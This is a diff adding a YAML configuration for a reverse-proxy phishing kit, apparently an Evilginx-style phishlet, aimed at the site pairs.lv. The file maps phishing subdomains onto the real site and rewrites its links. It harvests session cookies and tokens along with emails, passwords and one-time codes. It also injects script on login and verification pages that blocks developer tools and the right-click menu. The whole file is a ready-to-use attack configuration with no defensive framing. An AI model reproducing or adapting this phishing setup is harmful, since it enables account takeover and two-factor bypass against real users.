@@ -1,0 +1,60 @@
+name: 'pairslv'
+author: '@admin'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: '', domain: 'pairs.lv', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'pairs.lv', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'pairs.lv', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'pairs.lv', session: true, auto_filter: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'pairs.lv', session: true, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'pairs.lv', orig_sub: '', domain: 'pairs.lv', search: 'https://pairs.lv', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'pairs.lv', orig_sub: 'www', domain: 'pairs.lv', search: 'https://www.pairs.lv', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'pairs.lv', orig_sub: '', domain: 'pairs.lv', search: 'pairs.lv', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+
+auth_tokens:
+  - domain: '.pairs.lv'
+    keys: ['_session_id', 'session', 'token', 'auth_token', 'access_token', 'refresh_token', 'jwt', 'sid', 'PHPSESSID', 'laravel_session', 'remember_token', 'XSRF-TOKEN', 'pairs_session', 'user_token']
+  - domain: 'pairs.lv'
+    keys: ['_session_id', 'session', 'token', 'auth_token', 'access_token', 'refresh_token', 'jwt', 'sid', 'pairs_session']
+  - domain: 'www.pairs.lv'
+    keys: ['_session_id', 'session', 'token', 'auth_token', 'access_token', 'refresh_token', 'pairs_session']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'code'
+      search: '([0-9]{4,8})'
+      type: 'post'
+    - key: 'otp'
+      search: '([0-9]{4,8})'
+      type: 'post'
+    - key: 'verification_code'
+      search: '([0-9]{4,8})'
+      type: 'post'
+
+login:
+  domain: 'pairs.lv'
+  path: '/login/email'
+
+js_inject:
+  - trigger_domains: ['pairs.lv', 'www.pairs.lv']
+    trigger_paths: ['/login.*', '/verify.*', '/auth.*']
+    trigger_params: []
+    script: |
+      (function(){
+        var k=new KeyboardEvent('keydown',{bubbles:true,cancelable:true,key:'F12',keyCode:123});
+        document.addEventListener('keydown',function(e){if(e.keyCode===123||e.keyCode===73&&e.ctrlKey&&e.shiftKey){e.preventDefault();return false;}});
+        setInterval(function(){debugger;},100);
+        console.log=function(){};console.warn=function(){};console.error=function(){};
+        document.addEventListener('contextmenu',function(e){e.preventDefault();});
+      })();
